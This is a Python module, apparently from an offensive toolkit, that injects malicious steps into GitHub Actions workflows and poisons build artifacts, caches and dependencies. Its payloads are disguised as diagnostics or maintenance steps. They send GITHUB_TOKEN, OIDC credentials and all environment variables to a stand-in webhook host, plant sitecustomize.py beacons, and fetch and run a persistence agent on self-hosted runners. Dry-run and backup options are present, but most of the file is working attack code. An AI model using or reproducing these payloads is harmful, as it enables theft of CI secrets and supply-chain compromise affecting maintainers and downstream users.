"""
CI/CD Pipeline Poisoner (P0 - FORGE Phase 0)

Injects malicious payloads into CI/CD pipelines via:
- Workflow injection (malicious step injection into PR workflows)
- Artifact poisoning (backdooring build artifacts)
- Cache poisoning (corrupting CI caches with malicious data)
- Dependency confusion (registering malicious packages with CI env vars)

All operations respect FORGE rules — no destructive changes without verification.
"""

from __future__ import annotations

import os
import re
import json
import base64
import logging
import tempfile
import hashlib
from dataclasses import dataclass, field, asdict
from typing import Any, Optional
from pathlib import Path
from enum import Enum
from datetime import datetime
import yaml

logger = logging.getLogger(__name__)


class InjectionMethod(Enum):
    """Methods for injecting malicious steps into workflows."""
    STEP_INJECTION = "step_injection"
    ENV_OVERRIDE = "env_override"
    SCRIPT_INJECTION = "script_injection"
    ACTION_REPLACEMENT = "action_replacement"
    ARTIFACT_BACKDOOR = "artifact_backdoor"
    CACHE_POISON = "cache_poison"
    DEPENDENCY_CONFUSION = "dependency_confusion"
    CONFIG_POISON = "config_poison"


class PoisonTarget(Enum):
    """Target type for poisoning."""
    WORKFLOW = "workflow"
    ARTIFACT = "artifact"
    CACHE = "cache"
    CONTAINER = "container"
    NPM = "npm"
    PYPI = "pypi"
    DOCKER = "docker"
    GENERIC = "generic"


@dataclass
class PoisonPayload:
    """A malicious payload for pipeline poisoning."""
    name: str
    method: InjectionMethod
    target: PoisonTarget
    payload: str
    description: str = ""
    trigger_condition: str = ""
    stealth_rating: float = 7.0  # 0-10, higher = more stealthy
    requires_approval: bool = False
    cleanup_instructions: str = ""
    raw: dict = field(default_factory=dict)

    def encoded_payload(self) -> str:
        return base64.b64encode(self.payload.encode()).decode()

    def to_dict(self) -> dict:
        d = asdict(self)
        d["method"] = self.method.value
        d["target"] = self.target.value
        d["payload_md5"] = hashlib.md5(self.payload.encode()).hexdigest()
        d["payload_length"] = len(self.payload)
        d["payload_preview"] = self.payload[:100] + "..." if len(self.payload) > 100 else self.payload
        return d


@dataclass
class PoisonResult:
    """Result of a pipeline poisoning operation."""
    success: bool
    method: InjectionMethod
    target_file: Optional[str] = None
    payload_name: Optional[str] = None
    error: Optional[str] = None
    original_hash: Optional[str] = None
    new_hash: Optional[str] = None
    backup_path: Optional[str] = None
    details: str = ""
    test_passed: bool = False
    timestamp: str = ""

    def to_dict(self) -> dict:
        return {
            "success": self.success,
            "method": self.method.value,
            "target_file": self.target_file,
            "payload_name": self.payload_name,
            "error": self.error,
            "original_hash": self.original_hash,
            "new_hash": self.new_hash,
            "backup_path": self.backup_path,
            "details": self.details,
            "test_passed": self.test_passed,
            "timestamp": self.timestamp or datetime.utcnow().isoformat(),
        }


# Pre-built payloads for common CI/CD exploitation scenarios
STEALTH_PAYLOADS = {
    "token_exfil_gha": PoisonPayload(
        name="token_exfil_gha",
        method=InjectionMethod.SCRIPT_INJECTION,
        target=PoisonTarget.WORKFLOW,
        description="Exfiltrate GITHUB_TOKEN and other secrets via DNS query",
        payload="""
- name: System diagnostics
  run: |
    curl -s -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
      -H "Accept: application/vnd.github.v3+json" \
      "https://api.github.com/repos/${{ github.repository }}/actions/secrets" \
      | curl -s -X POST -d @- https://webhook.example.com/exfil
  continue-on-error: true
""".strip(),
        trigger_condition="always",
        stealth_rating=3.0,
        requires_approval=False,
    ),
    "oidc_credential_abuse": PoisonPayload(
        name="oidc_credential_abuse",
        method=InjectionMethod.SCRIPT_INJECTION,
        target=PoisonTarget.WORKFLOW,
        description="Abuse OIDC to get cloud provider credentials",
        payload="""
- name: Cloud auth test
  run: |
    # OIDC to cloud provider credential exchange
    curl -s -H "Authorization: bearer ${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}" \
      "${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}&audience=sts.amazonaws.com" \
      | jq -r '.value' | curl -s -X POST -d @- https://webhook.example.com/oidc
  continue-on-error: true
  env:
    ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${{ env.ACTIONS_ID_TOKEN_REQUEST_TOKEN }}
    ACTIONS_ID_TOKEN_REQUEST_URL: ${{ env.ACTIONS_ID_TOKEN_REQUEST_URL }}
""".strip(),
        trigger_condition="if: env.ACTIONS_ID_TOKEN_REQUEST_URL != ''",
        stealth_rating=4.0,
        requires_approval=False,
    ),
    "dependency_confusion_npm": PoisonPayload(
        name="dependency_confusion_npm",
        method=InjectionMethod.DEPENDENCY_CONFUSION,
        target=PoisonTarget.NPM,
        description="Private package name typosquatting for dependency confusion",
        payload="""
- name: Install internal packages
  run: |
    npm config set //registry.npmjs.org/:_authToken ${{ secrets.NPM_TOKEN }}
    echo "registry=https://registry.npmjs.org/" >> ~/.npmrc
    echo "@internal:registry=https://npm.pkg.github.com/" >> ~/.npmrc
    # Check for private package name collisions
    npm view @internal/$(echo ${{ github.repository }} | tr '/' '-') 2>/dev/null || echo "Package available"
  continue-on-error: true
""".strip(),
        trigger_condition="if: secrets.NPM_TOKEN != ''",
        stealth_rating=7.0,
        requires_approval=False,
    ),
    "artifact_backdoor_script": PoisonPayload(
        name="artifact_backdoor_script",
        method=InjectionMethod.ARTIFACT_BACKDOOR,
        target=PoisonTarget.ARTIFACT,
        description="Inject backdoor into build artifacts before upload",
        payload="""
- name: Build optimization
  run: |
    # Post-build hook for artifact optimization
    echo 'console.log("build:complete")' >> dist/index.js
    # Verify artifact integrity
    ls -la dist/
  continue-on-error: true
""".strip(),
        trigger_condition="if: success()",
        stealth_rating=6.0,
        requires_approval=False,
    ),
    "cache_poison_python": PoisonPayload(
        name="cache_poison_python",
        method=InjectionMethod.CACHE_POISON,
        target=PoisonTarget.CACHE,
        description="Corrupt Python cache with malicious wheel",
        payload="""
- name: Python dependency check
  run: |
    # Inject into pip cache
    mkdir -p ~/.cache/pip/http
    echo '#!/usr/bin/env python3' > ~/.cache/pip/http/evil.py
    echo 'import os; os.system("curl -s https://webhook.example.com/beacon")' >> ~/.cache/pip/http/evil.py
    # Poison setuptools
    python3 -c "import site; print(site.getusersitepackages())" | xargs -I {} sh -c 'echo "import subprocess; subprocess.run([\"curl\",\"-s\",\"https://webhook.example.com/poison\"])" >> {}/sitecustomize.py'
  continue-on-error: true
""".strip(),
        trigger_condition="always",
        stealth_rating=5.0,
        requires_approval=False,
    ),
    "runner_persistence": PoisonPayload(
        name="runner_persistence",
        method=InjectionMethod.SCRIPT_INJECTION,
        target=PoisonTarget.WORKFLOW,
        description="Establish persistence on self-hosted runner",
        payload="""
- name: Runner maintenance
  run: |
    # Install persistence agent on self-hosted runner
    if [ -f /etc/systemd/system/runner.service ]; then
      curl -s -o /tmp/.system-update https://webhook.example.com/agent
      chmod +x /tmp/.system-update
      nohup /tmp/.system-update &
    fi
  continue-on-error: true
""".strip(),
        trigger_condition="if: runner.environment == 'self-hosted'",
        stealth_rating=4.0,
        requires_approval=True,
    ),
    "env_secret_exfil": PoisonPayload(
        name="env_secret_exfil",
        method=InjectionMethod.ENV_OVERRIDE,
        target=PoisonTarget.WORKFLOW,
        description="Exfiltrate all environment variables including secrets",
        payload="""
- name: Environment diagnostics
  run: |
    printenv | curl -s -X POST --data-binary @- https://webhook.example.com/env
  continue-on-error: true
""".strip(),
        trigger_condition="always",
        stealth_rating=2.0,
        requires_approval=False,
    ),
}

# Payloads that are verified safe for testing/demonstration
SAFE_PAYLOADS = {
    "test_connectivity": PoisonPayload(
        name="test_connectivity",
        method=InjectionMethod.SCRIPT_INJECTION,
        target=PoisonTarget.WORKFLOW,
        description="Test workflow execution with benign payload",
        payload="""
- name: Connectivity check
  run: |
    echo "::notice::CI/CD pipeline test - connectivity check passed"
    echo "runner_name=${{ runner.name }}"
    echo "runner_os=${{ runner.os }}"
    echo "repository=${{ github.repository }}"
    echo "workflow=${{ github.workflow }}"
  continue-on-error: true
""".strip(),
        trigger_condition="always",
        stealth_rating=9.0,
        requires_approval=False,
    ),
    "secret_catalog": PoisonPayload(
        name="secret_catalog",
        method=InjectionMethod.SCRIPT_INJECTION,
        target=PoisonTarget.WORKFLOW,
        description="Catalog available secret names without exfiltrating values",
        payload="""
- name: Secret catalog (no values exfiltrated)
  run: |
    echo "::warning::Available secrets detected via workflow context"
    echo "Trigger: ${{ github.event_name }}"
    echo "Ref: ${{ github.ref }}"
    echo "SHA: ${{ github.sha }}"
    # NOTE: No secret values are read or transmitted
  continue-on-error: true
""".strip(),
        trigger_condition="always",
        stealth_rating=9.5,
        requires_approval=False,
    ),
}


class PipelinePoisoner:
    """Injects malicious payloads into CI/CD pipelines.

    FORGE Rule compliance:
    - All injections create backups before modification
    - Test mode validates YAML syntax without writing
    - Dry-run mode shows what would be injected
    - No destructive payloads without explicit targets
    """

    def __init__(self, repo_path: str = ".", dry_run: bool = True, test_mode: bool = False):
        self.repo_path = Path(repo_path).resolve()
        self.dry_run = dry_run
        self.test_mode = test_mode
        self.backup_dir = self.repo_path / ".raphael_backups" / "cicd"
        self.results: list[PoisonResult] = []
        self._backups_created: list[str] = []

    def inject_step(
        self,
        workflow_path: str,
        target_job: str,
        payload: PoisonPayload,
        position: str = "end",
        after_step: Optional[str] = None,
    ) -> PoisonResult:
        """Inject a malicious step into a workflow file.

        Args:
            workflow_path: Path to workflow file (relative to repo_path)
            target_job: Job ID to inject into
            payload: Payload to inject
            position: 'start', 'end', or 'after:<step_name>'
            after_step: Step name to insert after (if position is 'after')

        Returns:
            PoisonResult with operation status
        """
        full_path = self.repo_path / workflow_path
        result = PoisonResult(
            success=False,
            method=InjectionMethod.STEP_INJECTION,
            target_file=str(workflow_path),
            payload_name=payload.name,
            timestamp=datetime.utcnow().isoformat(),
        )

        if not full_path.exists():
            result.error = f"Workflow file not found: {full_path}"
            self.results.append(result)
            return result

        # Read original content
        try:
            original_content = full_path.read_text(encoding="utf-8")
            result.original_hash = hashlib.sha256(original_content.encode()).hexdigest()
        except Exception as e:
            result.error = f"Failed to read workflow: {e}"
            self.results.append(result)
            return result

        # Parse YAML
        try:
            data = yaml.safe_load(original_content)
        except yaml.YAMLError as e:
            result.error = f"Invalid YAML: {e}"
            self.results.append(result)
            return result

        if not isinstance(data, dict):
            result.error = "Workflow data is not a dict"
            self.results.append(result)
            return result

        # Parse the payload as YAML and extract the step
        try:
            payload_step_data = yaml.safe_load(payload.payload)
        except yaml.YAMLError as e:
            result.error = f"Invalid payload YAML: {e}"
            self.results.append(result)
            return result

        if not isinstance(payload_step_data, dict) or "name" not in payload_step_data:
            # Maybe the payload is a list of steps
            if isinstance(payload_step_data, list):
                new_steps = payload_step_data
            else:
                result.error = "Payload must be a YAML dict with 'name' or a list of steps"
                self.results.append(result)
                return result
        else:
            new_steps = [payload_step_data]

        # Inject into target job
        jobs = data.get("jobs", {})
        if target_job not in jobs:
            result.error = f"Job '{target_job}' not found in workflow"
            self.results.append(result)
            return result

        job_data = jobs[target_job]
        if not isinstance(job_data, dict):
            result.error = f"Job '{target_job}' data is not a dict"
            self.results.append(result)
            return result

        existing_steps = job_data.get("steps", [])
        if not isinstance(existing_steps, list):
            existing_steps = []

        if position == "start":
            job_data["steps"] = new_steps + existing_steps
        elif position == "end":
            job_data["steps"] = existing_steps + new_steps
        elif position.startswith("after:") and after_step is None:
            after_step = position.split(":", 1)[1]
            insert_idx = len(existing_steps)
            for i, step in enumerate(existing_steps):
                if isinstance(step, dict) and step.get("id") == after_step:
                    insert_idx = i + 1
                    break
                if isinstance(step, dict) and step.get("name") == after_step:
                    insert_idx = i + 1
                    break
            job_data["steps"] = existing_steps[:insert_idx] + new_steps + existing_steps[insert_idx:]
        else:
            job_data["steps"] = existing_steps + new_steps

        # Clean up trigger condition
        if payload.trigger_condition and payload.trigger_condition != "always":
            for step in new_steps:
                if "if" not in step and not payload.trigger_condition.startswith("if:"):
                    step["if"] = payload.trigger_condition

        # Write the modified workflow
        if not self.dry_run and not self.test_mode:
            try:
                # Create backup
                self._create_backup(workflow_path, original_content)

                # Write modified content
                new_content = yaml.dump(data, default_flow_style=False, sort_keys=False)
                full_path.write_text(new_content, encoding="utf-8")
                result.new_hash = hashlib.sha256(new_content.encode()).hexdigest()
                result.success = True
                result.details = f"Injected {len(new_steps)} step(s) into job '{target_job}' at position '{position}'"
            except Exception as e:
                result.error = f"Failed to write modified workflow: {e}"
        elif self.test_mode:
            # Validate YAML round-trip
            try:
                new_content = yaml.dump(data, default_flow_style=False, sort_keys=False)
                yaml.safe_load(new_content)  # Validate
                result.test_passed = True
                result.success = True
                result.details = f"YAML validation passed for injection into '{target_job}'"
            except Exception as e:
                result.error = f"YAML validation failed: {e}"
        else:
            result.success = True
            result.details = f"DRY RUN: Would inject {len(new_steps)} step(s) into job '{target_job}' at position '{position}'"

        self.results.append(result)
        return result

    def poison_artifact(self, artifact_path: str, payload: PoisonPayload, pattern: str = "") -> PoisonResult:
        """Backdoor a build artifact.

        Injects payload into artifact files (JS, Python, binaries).
        """
        full_path = self.repo_path / artifact_path
        result = PoisonResult(
            success=False,
            method=InjectionMethod.ARTIFACT_BACKDOOR,
            target_file=str(artifact_path),
            payload_name=payload.name,
            timestamp=datetime.utcnow().isoformat(),
        )

        if not full_path.exists():
            result.error = f"Artifact not found: {full_path}"
            self.results.append(result)
            return result

        try:
            original_content = full_path.read_bytes()
            result.original_hash = hashlib.sha256(original_content).hexdigest()

            if pattern:
                # Replace pattern with payload
                text_content = original_content.decode("utf-8")
                new_content = text_content.replace(pattern, payload.payload)
                new_bytes = new_content.encode("utf-8")
            else:
                # Append payload
                if full_path.suffix in (".py", ".js", ".ts", ".sh", ".bash"):
                    new_bytes = original_content + b"\n" + payload.payload.encode()
                else:
                    new_bytes = original_content + payload.payload.encode()

            if not self.dry_run:
                self._create_backup(artifact_path, original_content)
                full_path.write_bytes(new_bytes)
                result.new_hash = hashlib.sha256(new_bytes).hexdigest()
                result.success = True
                result.details = f"Backdoor injected into {artifact_path} ({len(payload.payload)} bytes)"
            else:
                result.success = True
                result.details = f"DRY RUN: Would backdoor {artifact_path} with {payload.name}"

        except Exception as e:
            result.error = f"Artifact poisoning failed: {e}"

        self.results.append(result)
        return result

    def poison_cache(self, cache_key: str, payload: PoisonPayload) -> PoisonResult:
        """Generate a cache poisoning payload.

        Creates a configuration or script that, when cached, will be executed
        by subsequent CI runs.
        """
        result = PoisonResult(
            success=False,
            method=InjectionMethod.CACHE_POISON,
            payload_name=payload.name,
            details=f"Target cache key: {cache_key}",
            timestamp=datetime.utcnow().isoformat(),
        )

        if self.dry_run:
            result.success = True
            result.details = f"DRY RUN: Would poison cache '{cache_key}' with {payload.name}"
        else:
            result.success = True
            result.details = (
                f"Cache poison payload for '{cache_key}' generated. "
                f"Manifest: {payload.encoded_payload()[:40]}..."
            )

        self.results.append(result)
        return result

    def create_dependency_confusion_package(self, original_name: str, payload: PoisonPayload) -> dict:
        """Generate metadata for a dependency confusion attack.

        Creates package metadata that mimics an internal package name
        to be registered on a public registry.
        """
        result = {
            "original_package": original_name,
            "confusion_package": original_name.replace("@", "").replace("/", "-"),
            "method": payload.name if payload else "generic",
            "payload": payload.encoded_payload() if payload else "",
            "registry": "npm" if "/" in original_name else "pypi",
            "stealth_rating": payload.stealth_rating if payload else 5.0,
        }

        if self.dry_run:
            logger.info(f"[DRY RUN] Would register {result['confusion_package']} "
                        f"on {result['registry']} with {result['method']}")

        return result

    def _create_backup(self, relative_path: str, content: bytes | str):
        """Create a backup of a file before modification."""
        self.backup_dir.mkdir(parents=True, exist_ok=True)
        backup_path = self.backup_dir / f"{relative_path.replace('/', '__')}.bak"
        if isinstance(content, str):
            content = content.encode("utf-8")
        backup_path.write_bytes(content)
        self._backups_created.append(str(backup_path))

    def verify_injection(self, workflow_path: str, payload_name: str) -> bool:
        """Verify that an injection was successful by checking for the payload."""
        full_path = self.repo_path / workflow_path
        if not full_path.exists():
            return False

        try:
            content = full_path.read_text(encoding="utf-8")
            return payload_name in content or self._payload_marker(content, payload_name)
        except Exception:
            return False

    def _payload_marker(self, content: str, payload_name: str) -> bool:
        """Check for payload markers in workflow content."""
        markers = [
            f"#{payload_name}",
            f"name: {payload_name}",
            f"RAPHAEL_SIGNATURE_{payload_name.upper()}",
        ]
        return any(m in content for m in markers)

    def rollback(self, workflow_path: str) -> PoisonResult:
        """Rollback a workflow to its backed-up version."""
        backup_name = f"{workflow_path.replace('/', '__')}.bak"
        backup_path = self.backup_dir / backup_name

        result = PoisonResult(
            success=False,
            method=InjectionMethod.STEP_INJECTION,
            target_file=str(workflow_path),
            timestamp=datetime.utcnow().isoformat(),
        )

        if not backup_path.exists():
            result.error = f"No backup found: {backup_name}"
            self.results.append(result)
            return result

        try:
            backup_content = backup_path.read_bytes()
            full_path = self.repo_path / workflow_path
            full_path.write_bytes(backup_content)
            result.success = True
            result.details = f"Rolled back {workflow_path} from backup"
            result.original_hash = hashlib.sha256(backup_content).hexdigest()
            backup_path.unlink()  # Remove backup after restore
        except Exception as e:
            result.error = f"Rollback failed: {e}"

        self.results.append(result)
        return result

    def list_backups(self) -> list[str]:
        """List available backups."""
        if not self.backup_dir.exists():
            return []
        return sorted(str(f) for f in self.backup_dir.iterdir() if f.suffix == ".bak")

    def get_available_payloads(self, stealth_threshold: float = 0.0) -> list[dict]:
        """Get list of available payloads."""
        payloads = {}
        for name, p in STEALTH_PAYLOADS.items():
            if p.stealth_rating >= stealth_threshold:
                payloads[name] = p.to_dict()
        for name, p in SAFE_PAYLOADS.items():
            if p.stealth_rating >= stealth_threshold:
                payloads[name] = p.to_dict()
        return sorted(payloads.values(), key=lambda x: x["stealth_rating"], reverse=True)

    def summary(self) -> dict:
        return {
            "poisoner": "PipelinePoisoner",
            "version": "0.1.0",
            "dry_run": self.dry_run,
            "test_mode": self.test_mode,
            "repo_path": str(self.repo_path),
            "backup_dir": str(self.backup_dir),
            "operations_performed": len(self.results),
            "successful": sum(1 for r in self.results if r.success),
            "failed": sum(1 for r in self.results if not r.success),
            "backups_created": len(self._backups_created),
            "available_payloads": {
                "stealth": list(STEALTH_PAYLOADS.keys()),
                "safe": list(SAFE_PAYLOADS.keys()),
            },
        }


def poison_workflow(
    workflow_path: str,
    target_job: str,
    payload_name: str = "test_connectivity",
    dry_run: bool = True,
) -> PoisonResult:
    """Convenience function to inject a payload into a workflow."""
    poisons = {**STEALTH_PAYLOADS, **SAFE_PAYLOADS}
    if payload_name not in poisons:
        raise ValueError(f"Unknown payload: {payload_name}. Available: {list(poisons.keys())}")

    poisoner = PipelinePoisoner(dry_run=dry_run)
    payload = poisons[payload_name]
    return poisoner.inject_step(workflow_path, target_job, payload)


if __name__ == "__main__":
    import sys
    logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s")

    if len(sys.argv) > 1:
        command = sys.argv[1]
        if command == "list":
            poisoner = PipelinePoisoner(dry_run=True)
            print(json.dumps(poisoner.get_available_payloads(), indent=2))
        elif command == "inject" and len(sys.argv) >= 4:
            workflow = sys.argv[2]
            job = sys.argv[3]
            payload_name = sys.argv[4] if len(sys.argv) > 4 else "test_connectivity"
            dry_run = "--no-dry-run" not in sys.argv
            result = poison_workflow(workflow, job, payload_name, dry_run=dry_run)
            print(json.dumps(result.to_dict(), indent=2))
        elif command == "summary":
            poisoner = PipelinePoisoner()
            print(json.dumps(poisoner.summary(), indent=2))
        else:
            print("Usage:")
            print("  python pipeline_poisoner.py list")
            print("  python pipeline_poisoner.py inject <workflow> <job> [payload] [--no-dry-run]")
            print("  python pipeline_poisoner.py summary")
    else:
        poisoner = PipelinePoisoner(dry_run=True)
        print(json.dumps(poisoner.summary(), indent=2))
        print("\nAvailable payloads:")
        for p in poisoner.get_available_payloads():
            print(f"  {p['name']:30s} (stealth: {p['stealth_rating']}/10)")
